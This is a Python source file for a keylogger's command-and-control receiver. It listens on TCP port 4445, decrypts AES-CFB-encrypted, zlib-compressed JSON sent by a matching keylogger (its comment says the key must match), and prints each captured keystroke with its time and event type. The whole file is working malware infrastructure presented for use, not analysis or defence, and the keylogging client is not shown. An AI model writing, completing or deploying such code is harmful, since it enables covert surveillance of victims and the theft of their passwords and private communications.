import socket
import zlib
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_KEY = b'your-secret-key-32'  # Must match keylogger's key
PORT = 4445


def decrypt_data(encrypted_data):
    """AES decryption using CFB mode"""
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]

    cipher = Cipher(
        algorithms.AES(ENCRYPTION_KEY),
        modes.CFB(iv),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def process_payload(data):
    """Handle decompression and parsing"""
    decompressed = zlib.decompress(data)
    return json.loads(decompressed.decode())


def start_receiver():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', PORT))
        s.listen()
        print(f"[*] Listening on port {PORT}")

        while True:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")

            try:
                while True:
                    # Read message length
                    header = conn.recv(4)
                    if not header:
                        break
                    length = int.from_bytes(header, 'big')

                    # Read encrypted payload
                    encrypted = b''
                    while len(encrypted) < length:
                        chunk = conn.recv(length - len(encrypted))
                        if not chunk:
                            break
                        encrypted += chunk

                    # Decrypt and process
                    decrypted = decrypt_data(encrypted)
                    keystrokes = process_payload(decrypted)

                    # Display results
                    for stroke in keystrokes:
                        print(f"[{stroke['time']}] {stroke['key']} ({stroke['event']})")

            except Exception as e:
                print(f"Error: {e}")
            finally:
                conn.close()


if __name__ == "__main__":
    start_receiver()